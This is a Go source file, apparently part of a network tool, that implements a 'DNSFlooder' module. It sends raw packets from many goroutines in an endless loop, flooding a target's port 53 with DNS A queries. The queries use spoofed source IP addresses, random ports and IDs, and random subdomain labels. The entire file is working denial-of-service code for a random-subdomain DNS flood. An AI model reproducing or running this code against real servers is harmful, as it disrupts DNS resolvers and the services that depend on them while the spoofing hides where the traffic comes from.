package modules

import (
	"log"
	"net"
	"strings"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/velp/mass/utils"
)

type DNSFlooder struct {
	wg               *sync.WaitGroup
	closer           chan struct{}
	domain           string
	netDevice        string
	srcIPRange       utils.IPv4Range
	srcPortRange     utils.RandomUint32Range
	ipHdrIDGenerator utils.RandomUint32Range
	dnsIDGenerator   utils.RandomUint32Range
	dstIP            net.IP
	srcMAC           net.HardwareAddr
	dstMAC           net.HardwareAddr
}

func NewDNSFlooder(iface *net.Interface, srcIPRange utils.IPv4Range, srcPortRange utils.RandomUint32Range, dstMAC net.HardwareAddr, dstIP net.IP, domain string) ModuleInterface {
	return &DNSFlooder{
		wg:               new(sync.WaitGroup),
		domain:           domain,
		netDevice:        iface.Name,
		srcIPRange:       srcIPRange,
		srcPortRange:     srcPortRange,
		ipHdrIDGenerator: utils.NewRandomUint32Range(0, 65535),
		dnsIDGenerator:   utils.NewRandomUint32Range(0, 65535),
		dstIP:            dstIP,
		srcMAC:           iface.HardwareAddr,
		dstMAC:           dstMAC,
	}
}

func (d *DNSFlooder) Run(goroutines int) {
	d.closer = make(chan struct{})
	for i := 0; i < goroutines; i++ {
		d.wg.Add(1)
		go d.send(i)
	}
}

func (d *DNSFlooder) Stop(wait bool) {
	close(d.closer)
	if wait {
		d.wg.Wait()
	}
}

func (d *DNSFlooder) send(idx int) {
	defer d.wg.Done()
	log.Printf("DNS A query sender #%v started", idx)
	defer log.Printf("DNS A query sender #%v stoped", idx)
	// Generators
	srcPortGenerator := d.srcPortRange
	srcIPGenerator := d.srcIPRange
	ipHdrIDGenerator := d.ipHdrIDGenerator
	dnsIDGenerator := d.dnsIDGenerator
	// Prepare static parts of packet and options
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       d.srcMAC,
		DstMAC:       d.dstMAC,
		EthernetType: 0x800,
	}
	ipv4Layer := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Id:       uint16(ipHdrIDGenerator.Next()),
		Protocol: layers.IPProtocolUDP,
		DstIP:    d.dstIP,
	}
	udpLayer := &layers.UDP{
		DstPort: layers.UDPPort(53),
	}
	dnsLayer := &layers.DNS{}
	// Open device
	handle, err := pcap.OpenLive(d.netDevice, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Printf("opening device %s failed: %s", d.netDevice, err)
		return
	}
	defer handle.Close()
	for {
		select {
		case <-d.closer:
			return
		default:
			// Change IPv4 layer
			ipv4Layer.SrcIP = srcIPGenerator.Next()
			// Change UDP layer
			udpLayer.SrcPort = layers.UDPPort(srcPortGenerator.Next())
			udpLayer.SetNetworkLayerForChecksum(ipv4Layer)
			// Change DNS query
			dnsLayer.ID = uint16(dnsIDGenerator.Next())
			dnsLayer.Questions = []layers.DNSQuestion{
				{
					Type:  layers.DNSTypeA,
					Class: layers.DNSClassIN,
					Name:  []byte(strings.ReplaceAll(d.domain, "*", utils.RandomString(10))),
				},
			}
			dnsLayer.QDCount = uint16(len(dnsLayer.Questions))
			// Serialize
			buffer := gopacket.NewSerializeBuffer()
			if err := gopacket.SerializeLayers(buffer, serializeOpts, ethernetLayer, ipv4Layer, udpLayer, dnsLayer); err != nil {
				log.Printf("packet preparation failed: %s", err)
			}
			// Send
			err = handle.WritePacketData(buffer.Bytes())
			if err != nil {
				log.Printf("sending packet failed: %s", err)
			}
		}
	}
}
